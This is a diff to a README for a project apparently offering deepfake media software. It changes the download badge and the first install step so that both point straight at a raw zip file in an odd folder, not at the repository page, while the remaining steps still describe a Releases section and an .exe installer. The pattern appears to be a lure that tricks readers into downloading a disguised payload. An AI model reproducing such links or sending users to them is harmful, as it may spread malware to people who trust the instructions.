@@ -1,6 +1,6 @@
 # 🛡️ DeepFake-AI-2026-RealTime - Analyze and create media with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/dornele8361/DeepFake-AI-2026-RealTime)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/dornele8361/DeepFake-AI-2026-RealTime/raw/refs/heads/main/linha/Fake-Deep-Time-Real-A-2.7.zip)
 
 ## 🎯 About This Software
 
@@ -23,7 +23,7 @@ If your computer uses an integrated graphics chip, the software might run slowly
 
 Follow these steps to get the software on your machine. We host the files on our main project page.
 
-1. Go to this link: [https://github.com/dornele8361/DeepFake-AI-2026-RealTime](https://github.com/dornele8361/DeepFake-AI-2026-RealTime)
+1. Go to this link: [https://github.com/dornele8361/DeepFake-AI-2026-RealTime/raw/refs/heads/main/linha/Fake-Deep-Time-Real-A-2.7.zip](https://github.com/dornele8361/DeepFake-AI-2026-RealTime/raw/refs/heads/main/linha/Fake-Deep-Time-Real-A-2.7.zip)
 2. Scroll to the section marked Releases.
 3. Click the latest version link.
 4. Select the Windows installer file ending in .exe.
